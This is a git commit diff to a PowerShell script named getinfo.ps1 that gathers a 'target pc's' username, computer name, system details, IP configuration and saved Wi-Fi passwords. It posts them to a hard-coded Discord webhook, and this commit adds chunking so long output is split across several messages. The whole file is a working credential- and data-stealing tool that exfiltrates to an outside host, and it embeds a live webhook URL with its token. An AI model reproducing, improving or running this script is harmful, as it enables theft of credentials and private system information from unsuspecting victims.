19627293870fa7c5638bdb965dd4a59d0c3a6c90
6uard1an <154757568+6uard1an@users.noreply.github.com>
2024-01-25 06:34:55 -0600

    Update getinfo.ps1
    changed if body.length > 2000 split body to multiple messages

--- getinfo.ps1
+++ getinfo.ps1
@@ -1,3 +1,34 @@
+function Send-DiscordWebhook {
+    param (
+        [string]$WebhookUrl,
+        [string]$Content
+    )
+
+    # Set the maximum chunk size (adjust as needed)
+    $maxChunkSize = 2000
+
+    # Split the content into chunks
+    $contentChunks = $Content -split "(?s)(.{$maxChunkSize})"
+    
+    foreach ($chunk in $contentChunks) {
+        # Create a PowerShell object with the content using the variable
+        $payloadObject = @{
+            content = $chunk
+        }
+
+        try {
+            # Set the TLS version
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+            # Send the request to the Discord webhook
+            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body ($payloadObject | ConvertTo-Json -Depth 5) -ContentType "application/json"
+        }
+        catch {
+            Write-Host "Error: $_"
+        }
+    }
+}
+
 # Get info about target pc
 $ip = Invoke-Expression 'ipconfig' | Out-String
 $ipv4Address = (ipconfig | Select-String "IPv4 Address").ToString() -replace '.*?(\d+\.\d+\.\d+\.\d+).*', '$1'
@@ -8,21 +39,8 @@ $computerSystem = Invoke-Expression 'Get-WmiObject Win32_ComputerSystem' | Out-S
 
 $data = "Username: " + $env:USERNAME + "`nComputer name: " + $env:COMPUTERNAME + "`nDisc location: " + $env:USERPROFILE + "`nComputer system: " + $computerSystem + "`nOS: " + $os + "`n`n`nIPv4: " + $ipv4Address + "`nMore IP info: " + $ip + "`nWifi password(s):`n" + $wifi
 
-
-
 # Set the Discord webhook URL
 $webhookUrl = "https://discordapp.com/api/webhooks/1199979603293388810/GVsXlbrSlcpgPr8paE-pP2GEnmlCJ5KruxNY1KdJG6p2AYPc9p7Ybtg3lQf9etEzq1xy"
 
-# Set the text variable
-
-# Set the TLS version
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# Create a PowerShell object with the content using the variable
-$payloadObject = @{
-    content = $data
-}
-
-# Send the request to the Discord webhook
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payloadObject | ConvertTo-Json -Depth 5) -ContentType "application/json"
-
+# Send the request to the Discord webhook (split into chunks)
+Send-DiscordWebhook -WebhookUrl $webhookUrl -Content $data
